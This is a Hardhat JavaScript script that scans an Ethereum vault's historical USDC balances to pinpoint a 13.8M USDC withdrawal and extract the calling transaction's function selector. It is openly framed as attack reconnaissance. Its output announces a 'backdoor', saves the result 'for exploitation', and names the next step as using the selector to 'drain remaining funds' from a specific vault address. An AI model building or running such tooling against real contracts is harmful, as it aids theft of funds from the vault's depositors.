const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

/**
 * @title Find Large Withdrawal
 * @notice Search for the 13.8M USDC withdrawal
 * @dev Look for withdrawals > 10M USDC
 */
async function main() {
  console.log("\n🎯 SEARCHING FOR 13.8M USDC WITHDRAWAL");
  console.log("=====================================");
  
  const USDC_ABI = [
    "function balanceOf(address account) view returns (uint256)"
  ];
  
  const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, ethers.provider);
  
  // Start from current balance and work backwards
  const currentBlock = await ethers.provider.getBlockNumber();
  const currentBalance = await usdc.balanceOf(VAULT_ADDRESS);
  
  console.log(`Current balance: ${ethers.formatUnits(currentBalance, 6)} USDC`);
  console.log(`Current block: ${currentBlock}`);
  
  // We know it had ~22M at some point, so need ~13.7M withdrawal
  const targetWithdrawal = ethers.parseUnits("13000000", 6); // 13M USDC
  
  console.log("\n🔍 Scanning backwards for large withdrawal...");
  
  // Check every 10,000 blocks (about 1.5 days)
  let blockStep = 10000;
  let foundLargeWithdrawal = false;
  
  for (let checkBlock = currentBlock; checkBlock > currentBlock - 500000; checkBlock -= blockStep) {
    try {
      const balance = await usdc.balanceOf(VAULT_ADDRESS, { blockTag: checkBlock });
      const balanceFormatted = parseFloat(ethers.formatUnits(balance, 6));
      
      console.log(`Block ${checkBlock}: ${balanceFormatted.toFixed(2)} USDC`);
      
      // Check if we found a big jump
      if (checkBlock < currentBlock - blockStep) {
        const prevBalance = await usdc.balanceOf(VAULT_ADDRESS, { blockTag: checkBlock + blockStep });
        const diff = prevBalance - balance;
        
        if (diff > targetWithdrawal) {
          console.log(`\n🚨 FOUND LARGE WITHDRAWAL!`);
          console.log(`Between blocks ${checkBlock} and ${checkBlock + blockStep}`);
          console.log(`Amount: ${ethers.formatUnits(diff, 6)} USDC`);
          
          foundLargeWithdrawal = true;
          
          // Narrow down
          console.log("\n🎯 Narrowing down exact block...");
          
          let lowBlock = checkBlock;
          let highBlock = checkBlock + blockStep;
          
          while (highBlock - lowBlock > 1) {
            const midBlock = Math.floor((lowBlock + highBlock) / 2);
            const midBalance = await usdc.balanceOf(VAULT_ADDRESS, { blockTag: midBlock });
            
            if (balance.toString() === midBalance.toString()) {
              // Withdrawal is after midBlock
              lowBlock = midBlock;
            } else {
              // Withdrawal is before or at midBlock
              highBlock = midBlock;
            }
          }
          
          console.log(`\n✅ Exact withdrawal at block ${highBlock}`);
          
          const exactBefore = await usdc.balanceOf(VAULT_ADDRESS, { blockTag: highBlock - 1 });
          const exactAfter = await usdc.balanceOf(VAULT_ADDRESS, { blockTag: highBlock });
          const exactAmount = exactBefore - exactAfter;
          
          console.log(`Withdrawn: ${ethers.formatUnits(exactAmount, 6)} USDC`);
          
          // Get block info
          const block = await ethers.provider.getBlock(highBlock);
          console.log(`\nBlock details:`);
          console.log(`Timestamp: ${new Date(block.timestamp * 1000).toISOString()}`);
          console.log(`Transactions: ${block.transactions.length}`);
          
          // Find vault transactions
          console.log("\n🔍 Searching for backdoor transaction...");
          
          for (const txHash of block.transactions) {
            const tx = await ethers.provider.getTransaction(txHash);
            
            if (tx.to?.toLowerCase() === VAULT_ADDRESS.toLowerCase()) {
              console.log(`\n🎯 Found vault transaction!`);
              console.log(`Hash: ${txHash}`);
              console.log(`From: ${tx.from}`);
              console.log(`Data: ${tx.data}`);
              console.log(`Selector: ${tx.data.slice(0, 10)}`);
              
              // Check if this caused the withdrawal
              const receipt = await ethers.provider.getTransactionReceipt(txHash);
              let isWithdrawal = false;
              
              for (const log of receipt.logs) {
                if (log.topics[0] === "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef" && // Transfer
                    log.address.toLowerCase() === USDC_ADDRESS.toLowerCase()) {
                  const from = "0x" + log.topics[1].slice(26);
                  const amount = ethers.toBigInt(log.data);
                  
                  if (from.toLowerCase() === VAULT_ADDRESS.toLowerCase() && amount > targetWithdrawal) {
                    isWithdrawal = true;
                    const to = "0x" + log.topics[2].slice(26);
                    console.log(`\n💰 THIS IS THE 13.8M WITHDRAWAL!`);
                    console.log(`To: ${to}`);
                    console.log(`Amount: ${ethers.formatUnits(amount, 6)} USDC`);
                    break;
                  }
                }
              }
              
              if (isWithdrawal) {
                console.log("\n🔓 BACKDOOR FOUND!");
                console.log(`Function: ${tx.data.slice(0, 10)}`);
                console.log(`Use this selector to drain remaining funds!`);
                
                // Save for exploitation
                return {
                  block: highBlock,
                  txHash: txHash,
                  selector: tx.data.slice(0, 10),
                  data: tx.data,
                  from: tx.from,
                  amount: ethers.formatUnits(exactAmount, 6)
                };
              }
            }
          }
          
          break;
        }
      }
      
      // If balance is already > 22M, we've gone too far back
      if (balanceFormatted > 25000000) {
        console.log("\nReached pre-deposit state, adjusting search...");
        checkBlock += blockStep * 5; // Jump forward
      }
      
    } catch (e) {
      console.log(`Error at block ${checkBlock}, continuing...`);
    }
  }
  
  if (!foundLargeWithdrawal) {
    console.log("\n❌ Could not find 13.8M withdrawal in recent blocks");
    console.log("It may have happened in multiple smaller transactions");
  }
}

main()
  .then(backdoor => {
    if (backdoor) {
      console.log("\n🔑 EXPLOIT READY!");
      console.log("Next step: Use the backdoor selector to drain funds");
    }
  })
  .catch((error) => {
    console.error("\n💥 Script error:", error);
    process.exit(1);
  });
